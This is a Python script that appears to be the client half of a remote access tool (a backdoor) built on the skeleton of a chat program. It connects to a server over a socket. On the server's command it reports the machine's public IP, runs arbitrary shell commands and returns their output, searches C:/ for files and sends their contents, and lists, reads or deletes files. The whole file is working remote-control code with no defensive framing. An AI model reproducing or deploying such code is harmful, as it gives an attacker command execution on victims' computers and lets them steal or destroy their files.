import socket
import threading
import subprocess
import socket
import os
import shutil




# # Example: Run 'ipconfig' command in Windows CMD
# command = 'cmd'

# # Use subprocess.run to execute the command
# result = subprocess.run(command, shell=True, capture_output=True, text=True)

# # Check the output and return code
# if result.returncode == 0:
#     print("Command executed successfully.")
#     print("Output:")
#     print(result.stdout)
# else:
#     print("Error executing the command.")
#     print("Error Output:")
#     print(result.stderr)


# Connecting To Server
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 55555))

def get_public_ip():
    import requests
    response = requests.get('https://httpbin.org/ip')
    return response.json().get('origin')


def list_files(directory, client):
    print("Listing files in:", directory)
    files = os.listdir(directory)
    for idx, file in enumerate(files, start=1):
        client.send(f"{idx}. {file}".encode('ascii'))

def view_file_contents(file_path, client):
    client.send(f'Viewing contents of: {file_path}'.encode('ascii'))
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            contents = file.read()
            client.send(contents.encode('ascii'))
    except FileNotFoundError:
        client.send("File not found.".encode('ascii'))

def delete_file(file_path, client):
    client.send(f"Deleting File: {file_path}".encode('ascii'))
    try:
        os.remove(file_path)
        client.send("File deleted successfully.".encode('ascii'))
    except FileNotFoundError:
        client.send("File not found.".encode('ascii'))

def file_manager(client):
    current_directory = "C:/"

    while True:
        client.send("\nOptions:".encode('ascii'))
        client.send("1. List Files".encode('ascii'))
        client.send("2. View File Contents".encode('ascii'))
        client.send("3. Delete File".encode('ascii'))
        client.send("4. Exit".encode('ascii'))

        client.send("Enter your choice (1-4): ".encode('ascii'))
        choice = client.recv(1024).decode('ascii')

        if choice == "1":
            list_files(current_directory, client)
        elif choice == "2":
            client.send("Enter the file name to view its contents: ".encode('ascii'))
            file_name = client.recv(1024).decode('ascii')
            
            file_path = os.path.join(current_directory, file_name)
            view_file_contents(file_path, client)
        elif choice == "3":
            client.send("Enter the file name to delete: ".encode('ascii'))
            file_name = client.recv(1024).decode('ascii')
            file_path = os.path.join(current_directory, file_name)
            delete_file(file_path, client)
        elif choice == "4":
            client.send("Exiting the program.".encode('ascii'))
            break
        else:
            client.send("Invalid choice. Please enter a number between 1 and 4.".encode('ascii'))


# wont work with images aduio and videos only with text
def search_file_or_folder(name, client, start_dir="C:/"):                            
    file_found = False  # Flag variable                                              

    for dirpath, dirnames, filenames in os.walk(start_dir):
        if name in dirnames or name in filenames:
            path = os.path.join(dirpath, name)
            client.send(f'Path: {path}'.encode('ascii'))
            if os.path.isfile(path):
                if os.path.exists(path):
                    with open(path, "r") as file:
                        content = file.read()
                        client.send(f'Content:\n {content}'.encode('ascii'))
                    file_found = True  # Set the flag to True after reading the file
                    break  # Stop the loop after reading the file
                else:
                    client.send('File does not exist'.encode('ascii'))
            elif os.path.isdir(path):
                entries = os.listdir(path)
                client.send("Contents: ".encode('ascii'))
                for entry in entries:
                    client.send(entry.encode('ascii'))

    if not file_found:
        client.send("File not found".encode('ascii'))



def run(command):
    p1 = subprocess.run(command, shell=True, capture_output=True, text=True)
    if p1.returncode:
        return p1.stderr
    return p1.stdout



# Listening to Server and Sending Nickname
def receive():
    while True:
        try:
            # Receive Message From Server
            # If 'NICK' Send Nickname
            message = client.recv(1024).decode('ascii')
            if message == 'I_P':
                client.send(get_public_ip().encode('ascii'))
            elif message.startswith('run'):
                command = message[len('run '):]
                client.send(run(command=command).encode('ascii'))
            elif message.startswith('find'):
                command =message[len('find '):]
                search_file_or_folder(client=client, name=command)
            elif message.startswith('file'):
                #will cause an issue right now
                file_manager(client=client)
                
            else:
                print(message)
                #pass
        except Exception as e:
            # Close Connection When Error
            print("An error occured!")
            print(e)
            client.close()
            break
        
# Sending Messages To Server
def write():
    while True:
        message = '{}: {}'.format(socket.gethostname(), input(''))
        client.send(message.encode('ascii'))
        
# Starting Threads For Listening And Writing
receive_thread = threading.Thread(target=receive)
receive_thread.start()

write_thread = threading.Thread(target=write)
write_thread.start()